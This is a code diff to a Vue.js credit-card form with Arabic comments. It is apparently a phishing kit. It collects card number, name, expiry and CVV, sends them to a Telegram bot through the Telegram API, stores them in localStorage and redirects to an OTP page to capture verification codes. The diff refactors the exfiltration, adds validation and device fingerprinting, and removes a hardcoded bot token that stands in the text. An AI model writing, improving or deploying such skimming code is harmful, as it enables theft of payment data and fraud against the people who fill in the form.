@@ -19,8 +19,7 @@ new Vue({
       isCardFlipped: false,
       focusElementStyle: null,
       isInputFocused: false,
-      telegramBotToken: "8642789421:AAH5WVNFF0yxI-OIRjtsMPuBw3cSawVF1pk",
-      telegramChatId: "8642789421"
+      isSubmitting: false // لمنع الإرسال المتكرر
     };
   },
   mounted() {
@@ -47,8 +46,8 @@ new Vue({
 
       return "visa"; // default type
     },
-		generateCardNumberMask () {
-			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
+    generateCardNumberMask () {
+      return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
     },
     minCardMonth () {
       if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
@@ -85,45 +84,83 @@ new Vue({
       }, 300);
       vm.isInputFocused = false;
     },
-    submitForm() {
+    /**
+     * التحقق من صحة بيانات البطاقة
+     */
+    validateCardData() {
       // التحقق من ملء جميع الحقول
       if (!this.cardNumber || !this.cardName || !this.cardMonth || !this.cardYear || !this.cardCvv) {
-        alert("يرجى ملء جميع الحقول");
+        alert("❌ يرجى ملء جميع الحقول");
+        return false;
+      }
+
+      // التحقق من طول رقم البطاقة
+      const cleanCardNumber = this.cardNumber.replace(/\s/g, '');
+      if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
+        alert("❌ رقم البطاقة غير صحيح");
+        return false;
+      }
+
+      // التحقق من طول CVV
+      if (this.cardCvv.length < 3 || this.cardCvv.length > 4) {
+        alert("❌ رمز CVV غير صحيح");
+        return false;
+      }
+
+      // التحقق من أن اسم صاحب البطاقة يحتوي على أحرف فقط
+      if (!/^[a-zA-Zأ-ي\s]+$/.test(this.cardName)) {
+        alert("❌ اسم صاحب البطاقة يجب أن يحتوي على أحرف فقط");
+        return false;
+      }
+
+      return true;
+    },
+    /**
+     * تنسيق رسالة البيانات
+     */
+    formatCardMessage() {
+      return `
+📋 <b>بيانات بطاقة ائتمان جديدة:</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 <b>رقم البطاقة:</b> <code>${this.cardNumber}</code>
+👤 <b>اسم صاحب البطاقة:</b> ${this.cardName}
+📅 <b>تاريخ الانتهاء:</b> ${this.cardMonth}/${this.cardYear}
+🔐 <b>CVV:</b> <code>${this.cardCvv}</code>
+💳 <b>نوع البطاقة:</b> ${this.getCardType.toUpperCase()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
+🌐 <b>الجهاز:</b> ${navigator.userAgent}
+      `.trim();
+    },
+    /**
+     * إرسال البيانات إلى تليجرام
+     */
+    submitForm() {
+      // منع الإرسال المتكرر
+      if (this.isSubmitting) {
+        alert("⏳ جاري إرسال البيانات، يرجى الانتظار...");
         return;
       }
 
+      // التحقق من صحة البيانات
+      if (!this.validateCardData()) {
+        return;
+      }
+
+      // التحقق من إعدادات تلجرام
+      if (!validateTelegramConfig()) {
+        alert("❌ خطأ: إعدادات تلجرام غير صحيحة. يرجى تحديث ملف config.js");
+        return;
+      }
+
+      this.isSubmitting = true;
+
       // إنشء رسالة البيانات
-      const message = `
-📋 بيانات بطاقة ائتمان جديدة:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💳 رقم البطاقة: ${this.cardNumber}
-👤 اسم صاحب البطاقة: ${this.cardName}
-📅 تاريخ الانتهاء: ${this.cardMonth}/${this.cardYear}
-🔐 CVV: ${this.cardCvv}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
-      `;
+      const message = this.formatCardMessage();
 
       // إرسال الرسالة إلى تليجرام
-      this.sendToTelegram(message);
-    },
-    sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
-      
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: this.telegramChatId,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
+      sendToTelegram(message)
+        .then(data => {
           alert("✅ تم إرسال البيانات بنجاح إلى تليجرام\nيرجى إدخال رمز التحقق");
           
           // حفظ بيانات البطاقة في localStorage
@@ -132,7 +169,9 @@ new Vue({
             cardName: this.cardName,
             cardMonth: this.cardMonth,
             cardYear: this.cardYear,
-            cardCvv: this.cardCvv
+            cardCvv: this.cardCvv,
+            cardType: this.getCardType,
+            timestamp: new Date().toISOString()
           };
           localStorage.setItem('cardData', JSON.stringify(cardData));
           
@@ -140,15 +179,14 @@ new Vue({
           setTimeout(() => {
             window.location.href = 'otp.html';
           }, 1500);
-        } else {
-          alert("❌ حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً");
-          console.error("خطأ تليجرام:", data);
-        }
-      })
-      .catch(error => {
-        alert("❌ خطأ في الاتصال. يرجى التحقق من الاتصال بالإنترنت");
-        console.error("خطأ:", error);
-      });
+        })
+        .catch(error => {
+          console.error("خطأ في الإرسال:", error);
+          alert(`❌ حدث خطأ أثناء الإرسال:\n${error.message}`);
+        })
+        .finally(() => {
+          this.isSubmitting = false;
+        });
     }
   }
 });
